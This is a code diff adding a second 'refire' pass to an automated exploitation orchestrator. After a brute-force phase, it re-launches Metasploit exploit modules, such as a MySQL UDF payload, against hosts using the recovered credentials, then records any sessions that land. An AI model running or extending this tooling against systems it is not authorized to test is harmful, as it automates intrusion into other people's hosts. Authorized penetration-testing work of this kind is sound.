@@ -506,6 +506,7 @@ class Orchestrator:
             if not self._stop.is_set() and not self.seeded:
                 self._brute_phase(display)
                 self._reconcile_after_brute()
+                self._refire_phase()
             # Verification runs only after all exploitation has settled, and never
             # touches a port that holds a session (see _verify_phase).
             if not self._stop.is_set():
@@ -815,6 +816,48 @@ class Orchestrator:
         finally:
             self._brute_pool.shutdown(wait=True)
             self.run.save_checkpoint()
+
+    def _refire_phase(self):
+        """Second fire pass for credentialed exploits. A recovered credential only
+        reaches the fire path after the brute phase runs, so an exploit that needs a
+        login (exploit/multi/mysql/mysql_udf_payload and the like) blocks on the
+        first pass. For each credential the run recovered, re-fire the candidates on
+        that credential's host that blocked or failed on its port, skipping any port
+        that already holds a session. Fires with the exact recovered credential, so
+        nothing is guessed; a candidate whose module declares no credential option
+        is rejected by the fire path rather than re-attempted blindly."""
+        for host in self.run.snapshot_hosts():
+            if not host.credentials or not host.candidates:
+                continue
+            ip = host.ip
+            sessioned = {s.port for s in host.sessions if s.port}
+            for cred in host.credentials:
+                for cand in host.candidates:
+                    if cand.fire_status not in ("blocked", "no_session", "error"):
+                        continue
+                    if not cand.port or cand.port != cred.port:
+                        continue
+                    if cand.port in sessioned:
+                        continue
+                    self.run.record_activity(
+                        "refire", f"{ip}:{cand.port} re-fire {cand.module} with "
+                        f"recovered {cred.username or '<user>'} credential")
+                    try:
+                        session, status, detail = self.msf.fire(
+                            cand, host, ip, cand.port, credential=cred)
+                    except Exception as e:
+                        logger.exception("re-fire failed for %s %s", ip,
+                                         cand.module)
+                        self.run.record_activity(
+                            "refire", f"{ip}:{cand.port} re-fire error: {e}")
+                        continue
+                    self.run.update_candidate_fire(ip, cand.module, status, detail)
+                    if session is not None:
+                        self.run.add_session(ip, session)
+                        sessioned.add(cand.port)
+                        self.run.record_activity(
+                            "refire", f"{ip}:{cand.port} {cand.module} landed with "
+                            f"recovered credential")
 
     def _reconcile_after_brute(self):
         """Upgrade any CLEAN host the brute phase gave a credential to COMPROMISED,
